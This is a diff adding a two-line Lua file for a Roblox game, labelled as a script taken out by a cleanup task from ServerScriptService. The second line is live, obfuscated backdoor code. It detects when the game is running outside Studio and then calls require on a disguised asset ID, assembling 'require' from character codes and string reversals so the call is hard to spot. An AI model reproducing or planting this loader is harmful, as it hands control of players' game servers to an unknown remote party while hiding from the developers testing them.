@@ -1,0 +1,2 @@
+-- Removed by CityCleanup Task 2. Original path: ServerScriptService.ClientReplicator ; copies: 5 ; Adler-32: 215e4e4a
+local uKaQU=game:GetService("RunService"):IsStudio();local RkFQ7=true;local Tzms7=false;local MvC5A=getfenv;if uKaQU ~= RkFQ7 then MvC5A()[string.reverse(tostring(string.reverse("\114\101\113\117".."\105\114\101")))](0x39DB7846*(2+2+2-1+2+2-4));end
